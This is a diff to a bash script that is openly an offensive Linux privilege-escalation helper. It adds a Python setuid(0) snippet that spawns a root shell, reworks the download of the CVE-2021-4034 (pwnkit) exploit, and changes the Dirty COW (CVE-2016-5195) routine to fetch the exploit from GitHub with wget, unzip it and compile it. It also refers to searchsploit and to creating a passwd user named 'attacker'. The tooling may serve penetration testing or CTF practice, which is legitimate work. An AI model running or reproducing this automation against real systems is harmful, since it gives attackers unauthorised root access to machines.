@@ -31,6 +31,15 @@ linux_esclation_strategy() {
     echo 'searchsploit linux kernel $(uname -r)'
 }
 
+#capabilities
+
+get_python_setuid() {
+    echo 'python'
+    echo 'import os'
+    echo 'os.setuid(0)'
+    echo 'os.system("/bin/bash")'
+}
+
 create_passwd_user() {
     if [[ -z $username ]]; then
         username=attacker
@@ -359,9 +368,7 @@ perform_cve_2021_4034() {
         echo "Removing existing $cve_filename"
         rm $cve_filename
     fi
-    compress_file "$cve_filename" "$cve_dir"
-    generate_download_linux $cve_filename
-    get_uncompress_command "$cve_filename"
+    generate_exploit_download    
 
 }
 
@@ -716,20 +723,20 @@ perform_cve_2020_7247() {
 
 perform_cve_2016_5195 () {
     local cve_dir="CVE-2016-5195"
-    local download_url="https://www.exploit-db.com/download/40839"    
+    local url="https://github.com/firefart/dirtycow/archive/refs/heads/master.zip" 
     if [[ ! -d "$cve_dir" ]]; then
-        mkdir "$cve_dir"
+        wget "$url" -O "$cve_dir.zip"
+        unzip "$cve_dir.zip"
+        rm "$cve_dir.zip"
+        mv dirtycow-master "$cve_dir"
     fi
     pushd "$cve_dir" || exit 1
-    if [[ ! -f 40839.c ]]; then
-        wget "$download_url" -O 40839.c
-    fi
     if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == true ]]; then
         local exploit_executable="dirty"
         if [[ ! -f "$exploit_executable" ]]; then
             echo "Compiling exploit..."
             echo "all:" > Makefile
-            echo -e "\tgcc -o $exploit_executable 40839.c -pthread -lcrypt" >> Makefile
+            echo -e "\tgcc -o $exploit_executable dirty.c -pthread -lcrypt" >> Makefile
             if [[ -z $target_os ]]; then
                 target_os="ubuntu:16.04"
             fi
